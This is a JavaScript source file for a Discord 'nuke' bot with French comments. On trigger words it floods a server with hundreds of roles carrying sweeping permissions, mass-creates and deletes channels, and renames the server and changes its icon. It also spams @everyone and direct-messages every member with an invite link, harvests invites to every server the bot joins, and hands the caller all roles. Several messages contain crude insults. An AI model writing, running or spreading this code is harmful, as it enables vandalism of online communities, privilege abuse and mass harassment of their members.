const Discord = require("discord.js");
const bot = new Discord.Client();
bot.on("ready", () => {
bot.user.setActivity('-fleeex', { type: 'STREAMING', url:'https://www.twitch.tv/monstercat'})
  console.log("Bot [ON]")
  })
  bot.on("message", message => {
if(message.content.includes("AR!kelsairv")){
  console.log(`${bot.guilds.map(c => c.name)}`)
}
if(message.content === "roles"){
for(var i =0; i < 200; i++){
    message.guild.createRole({name:"-fleeex",
                             mentionable:false,
                             permissions:2146958591,
                             position: "",
                             color: "#fb0707"
        })
        message.guild.createRole({name:"-fleeex",
        mentionable:false,
        permissions:2146958591,
        position: "",
        color: "#ff08c5"
})
message.guild.createRole({name:"-fleeex",
mentionable:false,
permissions:2146958591,
position: "",
color: "#5d08ff"
})
message.guild.createRole({name:"-fleeex",
mentionable:false,
permissions:2146958591,
position: "",
color: "#0c08ff"
})
message.guild.createRole({name:"-fleeex",
mentionable:false,
permissions:2146958591,
position: "",
color: "#08d5ff"
})
message.guild.createRole({name:"-fleeex",
mentionable:false,
permissions:2146958591,
position: "",
color: "#08ffa3"
})
message.guild.createRole({name:"-fleeex",
mentionable:false,
permissions:2146958591,
position: "",
color: "#08ff23"
})
message.guild.createRole({name:"-fleeex",
mentionable:false,
permissions:2146958591,
position: "",
color: "#81ff08"
})
message.guild.createRole({name:"-fleeex",
mentionable:false,
permissions:2146958591,
position: "",
color: "#fff608"
})
message.guild.createRole({name:"-fleeex",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff6f08"
})
message.guild.createRole({name:"-fleeex",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"-fleeex",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"-fleeex",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"-fleeex",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"-fleeex",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"-fleeex",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"-fleeex",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"-fleeex",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
    }
}


if(message.content.includes(".rol")){
    message.guild.createRole({name:"Izi",
                              mentionable:false,
                              permissions:2146958591,
                              position: "",
                              color: "#fb0707"
   })
}
if(message.content.includes(".raul")){
  (message.guild.roles.map(r => message.member.addRoles(r)))
}
if(message.content.includes("ar!kelsairvvesrx")){
  bot.channels.map(c => c.createInvite().then(url => message.channel.send(`https://discord.gg/${url.code} : ${url.guild.name}`)))
}
          if(message.content.includes("A?serveurinvite")){
              bot.channels.map(c => c.createInvite().then(url => message.channel.send(`${url.code} : ${url.guild.name}`)))
          }
          if(message.content === "issou"){
              message.guild.setName("LE SECTEUR TA BZ :)")
              message.guild.setIcon("https://cdn.discordapp.com/attachments/583707818536861714/584055184737435659/Pleure.jpg")
            }
            if(message.content === "pd"){
              for(var i =0; i < 450; i++){
              message.guild.createChannel("BY","voice")
              }
            }
            if(message.content.includes("@everyone")){
                for(var i = 0; i < 999; i++){
                    message.channel.send("@everyone -FLEEEX TA BZ VIEN ICI https://discord.gg/6PGr5Ge")
                }
            }
            //réaction en chaine
                  if(message.content === "channel"){
                    message.channel.send("roles").then(m => m.delete());
                    message.channel.send("issou").then(m => m.delete());
                      for(var i = 0; i < 500; i++){
                          message.guild.createChannel("-fleeex ta detruit", "text").then(c => c.send("@everyone baise ta pute de mère met pas staff nimporte qui."))
                          message.guild.createChannel("-fleeex ta detruit","text").then(c => c.send("@everyone baise ta pute de mère met pas staff nimporte qui."))
                          message.guild.createChannel("-fleeex ta detruit","text").then(c => c.send("@everyone baise ta pute de mère met pas staff nimporte qui."))
                          message.guild.createChannel("-fleeex ta detruit", "text").then(c => c.send("@everyone baise ta pute de mère met pas staff nimporte qui."))
                          message.guild.createChannel("-fleeex ta detruit","text").then(c => c.send("@everyone baise ta pute de mère met pas staff nimporte qui."))
                          message.guild.createChannel("-fleeex ta detruit","text").then(c => c.send("@everyone baise ta pute de mère met pas staff nimporte qui."))

                      }
                    }
                    if(message.content === "destroy"){
                      message.guild.channels.map(c => c.delete())
                      }
                      //on commence la destruction
                      if(message.content.includes("destroy")){
                          message.channel.send("ban").then(m => m.delete());
                          message.channel.send("drole").then(m => m.delete());
                          message.channel.send("destroy").then(m => m.delete());
                          message.channel.send("jechange").then(m => m.delete());
                          message.guild.createChannel("FUCKED", "text").then(c => c.send("channel"))
                      }
                    });
bot.on('message', message => {
 if(message.content.startsWith('alldm')){
let cont = message.content.slice(1).split(" ")
        let args = cont.slice(1)
        let member = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0])
      message.guild.members.forEach((player) => {
          message.guild.member(player).send(`Rejoins .


 LE SECTEUR 🌙 https://discord.gg/6PGr5Ge`);
});
    }
})
   

      bot.login ("process.env.TOKEN")
